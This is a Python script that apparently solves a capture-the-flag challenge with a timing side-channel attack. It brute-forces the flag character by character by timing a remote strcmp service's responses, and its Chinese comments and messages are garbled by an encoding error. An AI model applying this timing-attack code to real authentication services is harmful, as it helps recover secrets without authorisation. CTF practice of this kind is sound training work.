#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
åŸºäºéªŒè¯ç»“æœçš„ä¼˜åŒ–æ—¶é—´ä¾§ä¿¡é“æ”»å‡»è„šæœ¬
åˆ©ç”¨ç¡®è®¤çš„æ—¶é—´å·®å¼‚æ¨¡å¼æ¥å‡†ç¡®çˆ†ç ´flag
"""

import socket
import time
import string
import statistics

def connect_to_server():
    """è¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨"""
    host = "strcmp.chall.edgesecurity.team"
    port = 1341
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        return sock
    except Exception as e:
        print(f"[-] è¿æ¥å¤±è´¥: {e}")
        return None

def measure_response_time_optimized(test_string, num_samples=12):
    """ä¼˜åŒ–çš„å“åº”æ—¶é—´æµ‹é‡"""
    times = []
    successful_measurements = 0
    max_attempts = num_samples * 3
    
    for attempt in range(max_attempts):
        if successful_measurements >= num_samples:
            break
            
        sock = connect_to_server()
        if not sock:
            continue
            
        try:
            # æ¸…ç†åˆå§‹çŠ¶æ€
            sock.settimeout(1)
            try:
                initial = sock.recv(4096)
            except socket.timeout:
                pass
            
            # å‡†å¤‡æ•°æ®
            data = (test_string + "\n").encode('utf-8')
            
            # ç²¾ç¡®æ—¶é—´æµ‹é‡
            start_time = time.perf_counter()
            sock.send(data)
            
            try:
                sock.settimeout(3)
                response = sock.recv(4096)
            except socket.timeout:
                response = b""
            
            end_time = time.perf_counter()
            elapsed = end_time - start_time
            
            # è¿‡æ»¤å¼‚å¸¸å€¼ï¼ˆå¤ªå¿«æˆ–å¤ªæ…¢çš„å“åº”ï¼‰
            if 0.08 < elapsed < 0.12:
                times.append(elapsed)
                successful_measurements += 1
            
        except Exception as e:
            continue
        finally:
            sock.close()
        
        time.sleep(0.03)  # çŸ­æš‚ç­‰å¾…
    
    if len(times) >= 5:
        # å»æ‰æç«¯å€¼
        times_sorted = sorted(times)
        # å»æ‰æœ€é«˜å’Œæœ€ä½çš„20%
        trim_count = max(1, len(times) // 5)
        times_trimmed = times_sorted[trim_count:-trim_count] if len(times) > 4 else times_sorted
        
        avg_time = statistics.mean(times_trimmed)
        std_dev = statistics.stdev(times_trimmed) if len(times_trimmed) > 1 else 0
        return avg_time, std_dev, len(times_trimmed)
    elif times:
        avg_time = statistics.mean(times)
        return avg_time, 0, len(times)
    
    return 0, 0, 0

def optimized_timing_attack():
    """ä¼˜åŒ–çš„æ—¶é—´ä¾§ä¿¡é“æ”»å‡»"""
    print("=== ä¼˜åŒ–æ—¶é—´ä¾§ä¿¡é“æ”»å‡» ===")
    
    # ä»éªŒè¯çš„å‰ç¼€å¼€å§‹
    current_flag = "EdgeCTF{"
    print(f"ä»éªŒè¯çš„å‰ç¼€å¼€å§‹: '{current_flag}'")
    
    # ä¼˜åŒ–çš„å­—ç¬¦é›† - é¦–å…ˆå°è¯•æœ€å¸¸è§çš„å­—ç¬¦
    common_chars = string.ascii_letters + string.digits + "_-"
    special_chars = "!@#$%^&*()+=[]{}|;:,.<>?"
    charset = common_chars + special_chars
    
    max_flag_length = 50
    consecutive_failures = 0
    max_consecutive_failures = 3
    
    for pos in range(len(current_flag), max_flag_length):
        print(f"\n{'='*60}")
        print(f"çˆ†ç ´ä½ç½® {pos} (å½“å‰flag: '{current_flag}')")
        print(f"{'='*60}")
        
        char_results = {}
        measurement_quality = {}
        
        # æµ‹è¯•æ¯ä¸ªå­—ç¬¦
        total_chars = len(charset)
        for i, char in enumerate(charset):
            test_string = current_flag + char
            avg_time, std_dev, sample_count = measure_response_time_optimized(test_string)
            
            char_results[char] = avg_time
            measurement_quality[char] = (std_dev, sample_count)
            
            # å®æ—¶è¿›åº¦æ˜¾ç¤º
            progress = (i + 1) / total_chars * 100
            print(f"  [{progress:5.1f}%] '{char}': {avg_time:.6f}s (Â±{std_dev:.6f}s, n={sample_count})", end="\r")
        
        print()  # æ¢è¡Œ
        
        # åˆ†æç»“æœ - è¿‡æ»¤æ‰æµ‹é‡è´¨é‡å·®çš„ç»“æœ
        valid_results = {}
        for char, avg_time in char_results.items():
            std_dev, sample_count = measurement_quality[char]
            if sample_count >= 5 and avg_time > 0:  # åªè€ƒè™‘æœ‰è¶³å¤Ÿæ ·æœ¬çš„æµ‹é‡
                valid_results[char] = avg_time
        
        if not valid_results:
            print("  âŒ æ²¡æœ‰æœ‰æ•ˆçš„æµ‹é‡ç»“æœ")
            break
        
        # æ’åºç»“æœ
        sorted_chars = sorted(valid_results.items(), key=lambda x: x[1], reverse=True)
        
        print(f"\nå‰10ä¸ªå€™é€‰ (åŸºäº {len(valid_results)} ä¸ªæœ‰æ•ˆæµ‹é‡):")
        for i, (char, avg_time) in enumerate(sorted_chars[:10], 1):
            std_dev, sample_count = measurement_quality[char]
            print(f"  {i:2d}. '{char}': {avg_time:.6f}s (Â±{std_dev:.6f}s, n={sample_count})")
        
        # é€‰æ‹©æœ€ä½³å­—ç¬¦
        best_char = sorted_chars[0][0]
        best_time = sorted_chars[0][1]
        
        # è®¡ç®—æ—¶é—´å·®å¼‚çš„æ˜¾è‘—æ€§
        if len(sorted_chars) > 1:
            second_best_time = sorted_chars[1][1]
            time_difference = best_time - second_best_time
            relative_difference = time_difference / best_time * 100
            
            print(f"\n  æœ€ä½³é€‰æ‹©: '{best_char}' ({best_time:.6f}s)")
            print(f"  æ—¶é—´å·®å¼‚: {time_difference:.6f}s ({relative_difference:.2f}%)")
            
            # åˆ¤æ–­æ—¶é—´å·®å¼‚çš„æ˜¾è‘—æ€§
            if time_difference < 0.0002:
                print("  âš ï¸  æ—¶é—´å·®å¼‚å¾ˆå°ï¼Œå¯èƒ½å·²æ¥è¿‘flagæœ«å°¾")
                consecutive_failures += 1
            elif relative_difference < 0.5:
                print("  âš ï¸  ç›¸å¯¹æ—¶é—´å·®å¼‚è¾ƒå°ï¼Œé€‰æ‹©å¯èƒ½ä¸å¯é ")
                consecutive_failures += 1
            else:
                print("  âœ… æ—¶é—´å·®å¼‚æ˜¾è‘—ï¼Œé€‰æ‹©è¾ƒä¸ºå¯é ")
                consecutive_failures = 0
        else:
            print("  âš ï¸  åªæœ‰ä¸€ä¸ªæœ‰æ•ˆæµ‹é‡")
            consecutive_failures += 1
        
        # æ·»åŠ é€‰æ‹©çš„å­—ç¬¦
        current_flag += best_char
        print(f"  -> æ›´æ–°flag: '{current_flag}'")
        
        # æ£€æŸ¥æ˜¯å¦æ‰¾åˆ°ç»“å°¾
        if best_char == '}':
            print(f"\nğŸ‰ æ‰¾åˆ°å®Œæ•´flag: {current_flag}")
            break
        
        # æ£€æŸ¥æ˜¯å¦è¿ç»­å¤±è´¥å¤ªå¤šæ¬¡
        if consecutive_failures >= max_consecutive_failures:
            print(f"\nâš ï¸  è¿ç»­ {consecutive_failures} æ¬¡æ—¶é—´å·®å¼‚ä¸æ˜¾è‘—ï¼Œå¯èƒ½å·²åç¦»æ­£ç¡®è·¯å¾„")
            print("å°è¯•æ·»åŠ  '}' ç»“æŸç¬¦...")
            current_flag += "}"
            break
    
    return current_flag

def final_verification(flag):
    """æœ€ç»ˆéªŒè¯æ‰¾åˆ°çš„flag"""
    print(f"\n{'='*60}")
    print(f"æœ€ç»ˆéªŒè¯: {flag}")
    print(f"{'='*60}")
    
    # æµ‹è¯•å®Œæ•´flag
    sock = connect_to_server()
    if not sock:
        return False
    
    try:
        # è·å–æç¤º
        sock.settimeout(3)
        try:
            initial = sock.recv(4096)
            print(f"æœåŠ¡å™¨æç¤º: {initial.decode().strip()}")
        except:
            pass
        
        # å‘é€flag
        print(f"å‘é€flag: {flag}")
        start_time = time.perf_counter()
        sock.send((flag + "\n").encode('utf-8'))
        
        # è·å–å®Œæ•´å“åº”
        all_responses = []
        try:
            sock.settimeout(5)
            while True:
                response = sock.recv(4096)
                if not response:
                    break
                all_responses.append(response.decode())
                
                # æ£€æŸ¥æˆåŠŸæŒ‡ç¤º
                response_lower = response.decode().lower()
                if any(word in response_lower for word in 
                      ['correct', 'congratulations', 'success', 'well done', 'flag', 'right']):
                    end_time = time.perf_counter()
                    print(f"ğŸ‰ SUCCESS! æ­£ç¡®çš„flag: {flag}")
                    print(f"æœåŠ¡å™¨å“åº”: {response.decode().strip()}")
                    print(f"å“åº”æ—¶é—´: {end_time - start_time:.6f}s")
                    return True
                elif 'incorrect' in response_lower:
                    print(f"âŒ é”™è¯¯çš„flag")
                    print(f"æœåŠ¡å™¨å“åº”: {response.decode().strip()}")
                    return False
        except socket.timeout:
            print("å“åº”è¶…æ—¶")
        
        # æ‰“å°æ‰€æœ‰å“åº”
        if all_responses:
            print("å®Œæ•´å“åº”:")
            for resp in all_responses:
                print(f"  {resp.strip()}")
    
    except Exception as e:
        print(f"éªŒè¯å‡ºé”™: {e}")
    finally:
        sock.close()
    
    return False

if __name__ == "__main__":
    print("ä¼˜åŒ–æ—¶é—´ä¾§ä¿¡é“æ”»å‡» - strcmp(flag)")
    print("=" * 60)
    print("åŸºäºéªŒè¯ç»“æœè¿›è¡Œä¼˜åŒ–æ”»å‡»")
    
    # æ‰§è¡Œä¼˜åŒ–æ”»å‡»
    found_flag = optimized_timing_attack()
    
    # æœ€ç»ˆéªŒè¯
    if found_flag:
        success = final_verification(found_flag)
        
        if not success and not found_flag.endswith('}'):
            # å¦‚æœæ²¡æœ‰æˆåŠŸä¸”æ²¡æœ‰ç»“æŸç¬¦ï¼Œå°è¯•æ·»åŠ ç»“æŸç¬¦
            print(f"\nå°è¯•æ·»åŠ ç»“æŸç¬¦...")
            final_verification(found_flag + "}")
    
    print(f"\næœ€ç»ˆç»“æœ: {found_flag}")